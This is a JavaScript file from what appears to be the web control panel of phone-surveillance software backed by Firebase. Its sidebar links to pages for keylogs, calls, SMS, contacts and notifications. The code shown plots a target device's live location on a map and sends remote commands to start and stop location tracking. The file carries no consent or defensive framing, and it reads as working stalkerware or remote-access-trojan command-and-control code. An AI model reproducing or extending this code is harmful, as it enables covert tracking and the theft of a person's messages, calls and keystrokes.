// Initialize Firebase
try {
    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }
} catch (error) {
    console.error("Firebase initialization error:", error);
}

const db = firebase.database();

// Get Device ID from URL
const urlParams = new URLSearchParams(window.location.search);
const deviceId = urlParams.get('id');

if (!deviceId) {
    alert("No Device ID specified.");
    window.location.href = "index.html";
}

// Update Sidebar Links
const pages = ['dashboard', 'remote', 'location', 'keylogs', 'info', 'apps', 'calls', 'sms', 'contacts', 'notifications'];
pages.forEach(page => {
    const el = document.getElementById(`link-${page}`);
    if (el) {
        el.href = page === 'dashboard' ? `device.html?id=${deviceId}` : `${page}.html?id=${deviceId}`;
    }
});

// Map Logic
let map = null;
let locationMarker = null;
let accuracyCircle = null;

function initializeMap() {
    if (map) return;

    map = L.map('location-map').setView([0, 0], 2);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap contributors',
        maxZoom: 19
    }).addTo(map);

    const deviceIcon = L.divIcon({
        className: 'custom-marker',
        html: '<div style="background: #ef4444; width: 30px; height: 30px; border-radius: 50%; border: 3px solid white; box-shadow: 0 2px 8px rgba(0,0,0,0.3); display: flex; align-items: center; justify-content: center;"><i class="fas fa-mobile-alt" style="color: white; font-size: 14px;"></i></div>',
        iconSize: [30, 30],
        iconAnchor: [15, 15]
    });

    locationMarker = L.marker([0, 0], { icon: deviceIcon }).addTo(map);
}

function updateLocationOnMap(locationData) {
    if (!locationData || !locationData.latitude || !locationData.longitude) return;

    initializeMap();

    const { latitude, longitude, accuracy, speed, timestamp } = locationData;

    locationMarker.setLatLng([latitude, longitude]);
    map.setView([latitude, longitude], 17); // Higher zoom for "Live" feel

    if (accuracyCircle) map.removeLayer(accuracyCircle);
    if (accuracy) {
        accuracyCircle = L.circle([latitude, longitude], {
            radius: accuracy,
            color: '#3b82f6',
            fillColor: '#3b82f6',
            fillOpacity: 0.1,
            weight: 1
        }).addTo(map);
    }

    // Update stats
    document.getElementById('location-info').style.display = 'grid';
    document.getElementById('location-coords').textContent = `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
    document.getElementById('location-accuracy').textContent = accuracy ? `±${accuracy.toFixed(0)}m` : 'N/A';
    document.getElementById('location-speed').textContent = speed ? `${(speed * 3.6).toFixed(1)} km/h` : '0 km/h';
    document.getElementById('location-time').textContent = timestamp ? new Date(timestamp).toLocaleTimeString() : 'Never';
}

// Listen for Location Updates
db.ref(`devices/${deviceId}/location`).on('value', (snapshot) => {
    const data = snapshot.val();
    if (data) updateLocationOnMap(data);
});

// Commands
window.sendCommand = function (commandType, extras = {}) {
    if (!deviceId) return;

    db.ref(`commands/${deviceId}`).push({
        type: commandType,
        timestamp: firebase.database.ServerValue.TIMESTAMP,
        ...extras
    }).then(() => {
        // Optional: Toast or feedback
        console.log(`Command ${commandType} sent`);
    }).catch(e => alert("Failed to send command: " + e.message));
};

window.startLocationTracking = function () {
    window.sendCommand('start_location_tracking');
    alert("Tracking started. Updates should appear shortly.");
};

window.stopLocationTracking = function () {
    window.sendCommand('stop_location_tracking');
    alert("Tracking stopped.");
};

// Start Map
initializeMap();
